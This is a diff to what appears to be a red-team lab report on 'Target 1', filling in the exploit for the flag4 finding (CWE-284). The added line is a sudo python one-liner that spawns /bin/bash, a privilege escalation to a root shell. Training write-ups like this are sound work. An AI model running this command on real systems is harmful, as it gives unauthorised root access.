@@ -47,5 +47,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag4.txt`: _TODO: Insert `flag4.txt` hash value_
     - **Exploit Used**
       - CWE-284: Improper Access Control
-      - _TODO: Include the command run_
+      - sudo python -c 'import os; os.system("/bin/bash")'
+
 
